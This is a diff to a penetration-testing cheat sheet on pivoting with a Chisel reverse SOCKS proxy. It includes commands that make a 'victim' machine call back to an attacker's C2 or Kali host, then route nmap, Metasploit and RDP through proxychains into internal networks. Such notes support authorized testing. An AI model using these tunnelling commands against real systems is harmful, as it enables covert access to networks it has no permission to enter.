@@ -76,12 +76,12 @@ nc -lnvp 3333
 ```
 * Chisel Socks Proxy
     * Using `reverse` command
-        * On the server (C2[cloud] / Kali VM[internal/labs])
+        1. On the server (C2[cloud] / Kali VM[internal/labs])
             ```bash
             ./chisel server -v -p 8000 --reverse
             sudo echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
             ```
-        * On the client/target/victim machine
+        1. On the client/target/victim machine
             ```bash
             chisel.exe client -v <c2/kali_IP>:8000 R:socks
             or
@@ -89,10 +89,10 @@ nc -lnvp 3333
             or
             chisel.exe client -v 192.168.1.5:8000 R:socks
             ```
-        * On the server (C2[cloud] / Kali VM[internal/labs])
+        1. On the server (C2[cloud] / Kali VM[internal/labs])
             ```bash
             sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
-            ssh -NfD 1080 127.0.0.1 # or your c2 server (ssh -NfD 1080 attackerdomain.com)
+            ssh -NfD 1080 127.0.0.1
             proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
             proxychains msfconsole 
             proxychains rdesktop targetIP -u user -p password -g 90%
@@ -100,11 +100,11 @@ nc -lnvp 3333
             proxychains firefox
             ```
     * Using `socks5` command
-        * On the server (C2[cloud] / Kali VM[internal/labs])
+        1. On the server (C2[cloud] / Kali VM[internal/labs])
             ```bash
             ./chisel server -v -p 8000 --socks5
             ```
-        * On the client/target/victim machine
+        1. On the client/target/victim machine
             ```bash
             chisel.exe client -v <c2/kali_IP>:8000 socks
             or
@@ -112,16 +112,20 @@ nc -lnvp 3333
             or
             chisel.exe client -v 192.168.1.5:8000 socks
             ```
-        * On the server (C2[cloud] / Kali VM[internal/labs])
+        1. On the server (C2[cloud] / Kali VM[internal/labs])
             ```bash
             sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
-            ssh -NfD 1080 127.0.0.1 # or your c2 server (ssh -NfD 1080 attackerdomain.com)
+            ssh -NfD 1080 127.0.0.1
             proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
             proxychains msfconsole 
             proxychains rdesktop targetIP -u user -p password -g 90%
             proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
             proxychains firefox
             ```
+    * TIP
+        * If the chisel server is on a cloud C2, and you want to connect from your kali(separate machine)
+            * Perform step 3 on your Kali instead, no need to do it on the chisel server
+                * Just change `ssh -NfD 1080 127.0.0.1` to `ssh -NfD 1080 ubuntu@c2domain.com`
 
 
 [^1]: [not so pro](https://blog.notso.pro/2019-10-24-tactical-debriefing1/)
